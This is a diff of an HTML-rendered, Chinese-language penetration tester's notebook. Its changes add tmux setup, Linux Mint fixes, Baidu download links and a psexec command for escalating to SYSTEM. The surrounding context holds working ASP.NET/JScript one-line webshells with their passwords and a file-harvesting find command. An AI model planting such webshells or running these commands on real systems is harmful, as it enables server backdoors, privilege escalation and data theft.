@@ -381,10 +381,11 @@
    (/<span class="ge">*-/*</span>-<span class="ge">*/P/*</span>-/<span class="ge">*-*</span>/,/<span class="ge">*-/*</span>-<span class="ge">*/"u"+"n"+"s"/*</span>-/<span class="ge">*-*</span>/+"a"+"f"+"e"/<span class="ge">*-/*</span>-<span class="err">*</span>/);%&gt;  密码 -7
     
     
-   <span class="nv">&lt;%@PageLanguage="Jscript"%&gt;&lt;%eval(Request.Item["shezhang"],"unsafe");%&gt;</span>
+   <span class="nv">&lt;%@PageLanguage="Jscript"%&gt;&lt;%eval(Request.Item["shezhang"],"unsafe");%&gt;</span><span class="sb">
+
     
     
-   <span class="nt">&lt;script</span><span class="na">language=</span><span class="s">"C#"</span><span class="na">runat=</span><span class="s">"server"</span><span class="nt">&gt;</span>      
+</span>   <span class="nt">&lt;script</span><span class="na">language=</span><span class="s">"C#"</span><span class="na">runat=</span><span class="s">"server"</span><span class="nt">&gt;</span>      
    WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y("add6bb58e139be10");      
    <span class="nt">&lt;/script&gt;</span>                              密码是webadmin
 
@@ -393,7 +394,7 @@
    (<span class="err">&lt;</span>%WebServices.ShowRunnerVersion();%&gt;,<span class="err">&lt;</span>%WebServices.InitializeWebServices("fuck");%&gt;)
 <span class="p">
 32.</span>phpstudy for linux:
-  wget -c http://lamp.phpstudy.net/phpstudy.bin?
+  wget -c http://lamp.phpstudy.net/phpstudy.bin
   chmod +x phpstudy.bin
   # 权限设置
   ./phpstudy.bin     #运行安装
@@ -910,7 +911,13 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
         1.s和x的区别,s是delete+insert,x是delete
 
     my tmux配置:
-        #https://github.com/tmux/tmux     安装最新版本
+		step1.
+        https://github.com/tmux/tmux     安装最新版本
+		step2.
+		https://github.com/3xp10it/.tmux/blob/master/README.md
+
+		Or:
+
         https://github.com/gpakosz/.tmux 安装比较好的配置
         echo $EDITOR
         export EDITOR=vim
@@ -1861,8 +1868,8 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 <span class="p">
 263.</span>wooyun文章
 	链接:http://pan.baidu.com/s/1i4ZP8Vj 密码:yybp
-<span class="p">
-264.</span>eval和assert的区别
+	链接:http://pan.baidu.com/s/1mhZJFS0 密码：t20m
+<span class="p">264.</span>eval和assert的区别
 	http://www.vuln.cn/8395
 	http://www.php.net/manual/zh/function.eval.php
 	http://php.net/manual/zh/functions.variable-functions.php
@@ -1872,8 +1879,34 @@ MyThread类中的函数时,只有一个参数时要用<span class="err">[</span>
 <span class="p">
 266.</span>gitignore文件
 	https://github.com/github/gitignore
+<span class="p">267.</span>linux mint安装fcitx
+	http://einverne.github.io/post/2015/10/things-to-do-after-install-linux-mint.html
+	弃用rime,上面这个就可以用了
+<span class="p">
+268.</span>linux mint 18没有声音解决办法
+	https://forums.linuxmint.com/viewtopic.php?t=184577
+<span class="p">
+269.</span>linux字体问题解决不美观
+	http://blog.csdn.net/skykingf/article/details/43816435
+<span class="p">
+270.</span>linux mint安装vmware后,win键不按也相当于按下的解决办法:
+	由于在linux mint中win+d是回到桌面的快捷键,为了更好使用vim的caps键,在系统中设置将caps键变成如下效果:
+		按住caps键时caps键相当于ctrl键,按一下caps键时caps键相当于esc键<span class="p">[</span><span class="nv">这样对vim有很多好处</span><span class="p">]</span>,实现方法是:在
+		.zshrc|.bashrc文件中加上:
+		setxkbmap -option 'caps:ctrl_modifier' &amp;&amp; xcape -e 'Caps_Lock=Escape' &amp;
+	也许是由于这样产生了一个问题:导致在虚拟机中ctrl+alt退出到主机<span class="p">[</span><span class="nv">linux mint18</span><span class="p">]</span>后win键不按下也相当于按下,后来发
+	现可以这样解决:
+		新建一个自定义快捷键ctrl+空格,对应执行系统命令为setxkbmap,这样从虚拟机中ctrl+alt退出到主机后:
+		d:到桌面<span class="p">[</span><span class="nv">这时win键还是不听话的</span><span class="p">]</span>
+		caps+空格<span class="err">[</span>按下这个组合比较简单,这里caps由于上面设置了,相当于ctrl+空格,然后win键就会听话了,原因是只要重
+		新运行下setxkbmap这个程序,win键就突然听话了]
+<span class="p">		
+271.</span>psexec从administrator权限获取system权限:
+	psexec.exe -s cmd.exe
+	psexec.exe <span class="se">\\</span>xxx -s cmd.exe
 </code></pre>
 </div>
+
 </span>
 
         
